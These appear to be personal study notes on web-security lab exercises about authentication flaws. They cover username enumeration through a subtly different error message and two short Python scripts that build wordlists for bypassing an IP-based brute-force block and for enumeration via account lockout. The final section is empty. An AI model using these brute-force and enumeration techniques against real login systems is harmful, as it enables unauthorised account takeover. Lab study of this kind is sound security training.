# Authentication vulnerabilities

## Lab: Username enumeration via subtly different responses

Invalid username message: `Invalid username or password.`  
Valid username message: `Invalid username or password`(a dot missing)  

## Lab: Broken brute-force protection, IP block

Defense: limit the wrong attemps per IP, but reset conter when log in successfully.
Bypass: X times attemps and followed by a correct login.

```python
us_f = open("username", "r")
ps_f = open("password", "r")
passwords = ps_f.readlines()
ps_t = open("password_tmp", "w")
us_t = open("username_tmp", "w")
# wiener&peter are valid
for i in range(len(passwords)):
    if (i % 2 == 0):
        us_t.write("wiener\n")
        ps_t.write("peter\n")
    us_t.write("carlos\n")
    ps_t.write(passwords[i])
    print(passwords[i], end='')
```

## Lab: Username enumeration via account lock

```python
us_f = open("username", "r")
usernames = us_f.readlines()
ps_f = open("password", "r")
passwords = ps_f.readlines()
ps_t = open("password_tmp", "w")
us_t = open("username_tmp", "w")

for i in range(len(usernames)):
    us_t.write(usernames[i])
    ps_t.write(passwords[0])
    us_t.write(usernames[i])
    ps_t.write(passwords[1])
    us_t.write(usernames[i])
    ps_t.write(passwords[2])

ps_t.close()
us_t.close()
```

## Lab: Username enumeration via account lock


